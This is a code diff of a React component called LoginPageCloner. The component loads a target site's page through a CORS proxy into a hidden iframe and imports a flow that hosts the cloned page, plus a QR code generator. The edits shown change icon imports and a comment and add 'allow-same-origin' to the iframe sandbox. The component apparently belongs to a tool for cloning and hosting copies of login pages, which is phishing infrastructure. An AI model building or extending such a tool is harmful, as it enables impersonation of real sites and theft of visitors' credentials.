@@ -9,7 +9,7 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe, Copy, Wand, StopCircle, Code, Eye } from 'lucide-react';
+import { Loader2, AlertTriangle, Globe, Download, RefreshCw, Bot, Copy, Wand, StopCircle, Code, Eye } from 'lucide-react';
 import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
 import { useToast } from '@/hooks/use-toast';
 import { QrCodeGenerator } from './qr-code-generator';
@@ -99,11 +99,10 @@ export function LoginPageCloner() {
     resetState();
     toast({ title: "Cloning page...", description: "This may take a moment. Ensure the target site allows framing." });
 
-    // Use a hidden iframe to fetch the page content client-side
     const iframe = iframeRef.current;
     if (!iframe) return;
     
-    // Using a proxy to bypass CORS issues. In a real app, this would be a self-hosted proxy.
+    // Use a proxy to bypass CORS issues. In a real app, this would be a self-hosted proxy.
     const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(values.targetUrl)}`;
     
     iframe.src = proxyUrl;
@@ -197,7 +196,7 @@ export function LoginPageCloner() {
   
   return (
     <>
-      <iframe ref={iframeRef} sandbox="allow-scripts" className="hidden" title="cloner"></iframe>
+      <iframe ref={iframeRef} sandbox="allow-scripts allow-same-origin" className="hidden" title="cloner"></iframe>
       <div className="grid lg:grid-cols-5 gap-6">
         <div className="lg:col-span-2 space-y-6">
           <Card>
